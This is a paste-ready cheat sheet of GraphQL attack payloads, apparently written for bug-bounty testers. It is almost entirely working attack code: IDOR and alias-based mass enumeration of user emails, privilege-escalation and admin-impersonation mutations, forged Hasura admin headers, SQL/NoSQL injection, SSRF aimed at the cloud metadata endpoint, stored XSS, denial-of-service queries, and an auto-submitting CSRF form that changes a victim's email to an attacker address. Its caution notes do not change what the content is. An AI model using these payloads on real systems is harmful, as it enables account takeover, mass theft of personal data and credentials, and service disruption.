# Paste-ready GraphQL attack queries

⚠️ Respect program rules — many forbid DoS/high-RPS. Use the smallest probe that proves the flaw.
Respect the 50-record exfil cap; prefer counts. See references/05 and 03.

---

## IDOR / BOLA probes

```graphql
# Direct object arg
query { order(id: "TARGET_ID") { id total customerEmail shippingAddress } }

# node() global-ID IDOR (decode/increment: echo -n 'User:2' | base64  → VXNlcjoy)
query {
  node(id: "VXNlcjoy") {
    ... on User  { id email fullName phoneNumber }
    ... on Order { id total customerEmail }
    ... on Team  { id name billingEmail }
  }
}

# Nested-resolver leak (top object authorized, nested not re-checked)
query { me { organization { members { id email } billingAccount { last4 stripeCustomerId } } } }

# Alias mass-enumeration (generate u1..u500 with the one-liner below)
query { u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} }
```
Generate the alias sweep:
```bash
python3 -c 'print("query{"+" ".join(f"u{i}:user(id:{i}){{email}}" for i in range(1,501))+"}")'
```

## BFLA / privesc probes
```graphql
mutation { updateUserRole(userId:"me", role:"SUPER_ADMIN") { id role } }
mutation { impersonateUser(userId:"ADMIN_ID") { sessionToken } }
query    { adminUsers(first:50){ nodes{ email role lastLoginIp } } }
```
Hasura header injection (send as request headers):
```
x-hasura-role: admin
x-hasura-user-id: <victim-uuid>
```

## Mass assignment
```graphql
mutation { signup(input:{ email:"me@x.com", password:"x", role:"ADMIN", isVerified:true }) { id role } }
mutation { updateUser(input:{ id:"me", plan:"ENTERPRISE", emailVerified:true }) { plan } }
```

## Injection probes (fuzz each arg)
```graphql
{ users(filter: "1' OR '1'='1") { id email } }                 # SQLi
{ product(id: "1 OR SLEEP(5)") { name } }                       # time-based blind
{ users(where: { age: { "$gt": 0 } }) { email } }               # NoSQL operator
mutation { importFromUrl(url:"http://169.254.169.254/latest/meta-data/") { data } }   # SSRF→IMDS
mutation { updateProfile(bio:"<img src=x onerror=alert(document.domain)>") { id } }   # stored XSS
```

## DoS probes (SMALL — prove control is missing, don't take the service down)
```graphql
# Field duplication (10× is enough to show linear cost scaling)
query { me { id id id id id id id id id id } }

# Deep recursion on a circular relation (shallow probe to find the depth limit)
query { user(id:1){ posts{ author{ posts{ author{ id }}}}} }

# Circular fragment (send once, measure, stop)
query { ...A }
fragment A on Query { ...B }
fragment B on Query { ...A }

# Pagination abuse (often better as MASS-PII than DoS — use totalCount to prove scale)
{ users(first: 1000000) { edges { node { email } } } }
```

## CSRF PoC (form content-type — cookie sessions only)
```html
<form action="https://TARGET/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{updateEmail(email:\"attacker@evil.com\"){id}}","variables":{}}' value="">
</form>
<script>document.forms[0].submit()</script>
```

## Subscription BOLA (least-guarded surface)
```graphql
subscription { messageAdded(channelId:"PRIVATE_CHANNEL") { body author } }
subscription { orderUpdated { id customerEmail total } }   # unfiltered firehose = all tenants
```
